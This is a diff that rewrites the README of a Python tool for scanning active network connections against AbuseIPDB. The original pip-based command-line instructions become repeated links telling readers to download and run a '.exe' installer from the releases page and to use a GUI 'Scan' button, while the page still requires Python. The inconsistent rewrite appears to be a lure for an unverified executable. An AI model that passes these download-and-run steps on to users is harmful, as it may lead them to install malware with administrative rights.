@@ -1,43 +1,86 @@
-## IPNetstatScanner 
+# 🔍 ActiveConnectionScanner - Scan for Malicious Connections Easily
 
-This is a python tool to scan active connections in locally and provide some information about the IPs you are connected to and let you know if there is any malicious connections.
+![Download ActiveConnectionScanner](https://img.shields.io/badge/Download-ActiveConnectionScanner-blue)
 
-## Features
+## 🚀 Getting Started
 
-- List active network connections on your machine.
-- Query IP addresses in a threat intelligence database.
-- Display malicious score and threat rating for each IP.
-- Show geolocation information (country/region) of IPs.
-- Easy-to-read output suitable for analysts or hobbyists.
+Welcome to ActiveConnectionScanner! This tool helps you check active connections on your Windows machine. It identifies the IPs your computer is connected to and flags any suspicious connections using data from AbuseIPDB.
 
-## Installation
+## 💻 System Requirements
 
-1. Clone the repository:
+Before you begin, ensure your system meets the following requirements:
 
+- Windows 10 or later
+- Python 3.6 or higher
+- Administrative access to run the tool
 
-git clone 
-cd IPNetstatScanner
-Install dependencies:
+## 🔗 Download & Install
 
+To get started with ActiveConnectionScanner, visit this page to download the latest release:
 
+[Download ActiveConnectionScanner](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/releases)
 
-pip install -r requirements.txt
-Usage:
-Youll need to modify ip_lookup.py to add your API key of abuseIPDB to the code, or directly comment out the API function and use the other one I provided
+### 🛠 Installation Steps
 
+1. **Visit the Releases Page**  
+   Go to the [ActiveConnectionScanner Releases](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/releases) page.
+   
+2. **Download the File**  
+   Look for the latest version and download the `.exe` file for your system.
 
-install the script: 
-pip install -e .
+3. **Run the Installer**  
+   Locate the downloaded file and double-click it to run the installer. Follow the on-screen prompts to complete the installation.
 
-then run it:
-ipnetstatscanner
+4. **Launch the Tool**  
+   After installation, you will find ActiveConnectionScanner in your applications. Open it to begin scanning your active connections.
 
-The tool will display active connections and threat information for each IP.
+## 📊 Usage Instructions
 
+Once you have installed ActiveConnectionScanner, follow these steps to use it:
 
+1. **Open ActiveConnectionScanner**  
+   Click on the application icon to launch the tool.
 
-## Security Disclaimer
-This tool is intended for educational purposes only. Do not use it to scan networks or IPs without proper authorization. Always follow ethical hacking guidelines and your local laws.
+2. **Start the Scan**  
+   Click the "Scan" button. This will initiate the scanning of your active connections.
 
-License
-This project is licensed under the MIT License.
+3. **Review Results**  
+   After the scan completes, you will see a list of active IP connections. The tool will highlight any potential malicious connections based on data from AbuseIPDB.
+
+4. **Take Action**  
+   If you see any suspicious IPs, consider blocking them or investigating further.
+
+## 📦 Features
+
+- **Real-Time Scanning**: Quickly check all active connections on your machine.
+- **Malicious IP Detection**: Uses AbuseIPDB to identify potential threats.
+- **User-Friendly Interface**: Simple design makes it easy for anyone to use.
+- **Detailed Reports**: View comprehensive details about each connection.
+
+## 🔧 Troubleshooting Tips
+
+If you encounter any issues while using ActiveConnectionScanner, try the following:
+
+- **Run as Administrator**: Ensure you have administrative permissions to scan network connections.
+- **Check Firewall Settings**: Ensure your firewall does not block the tool from accessing the network.
+- **Update Python**: Make sure you have the latest version of Python installed, as this tool requires Python 3.6 or higher.
+
+## 💬 Getting Help
+
+If you need further assistance, visit the [GitHub Issues](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/issues) page. Here, you can report bugs or ask for help from the community.
+
+## 🌍 Community and Support
+
+We welcome community support! Feel free to share your feedback or suggestions. Your input helps improve ActiveConnectionScanner for everyone.
+
+## 📜 License
+
+This project is licensed under the MIT License. For more information, please see the LICENSE file included in the repository.
+
+## 🔗 Important Links
+
+- [Download ActiveConnectionScanner](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/releases)
+- [GitHub Repository](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner)
+- [AbuseIPDB](https://www.abuseipdb.com)
+
+Thank you for choosing ActiveConnectionScanner! Stay safe online.
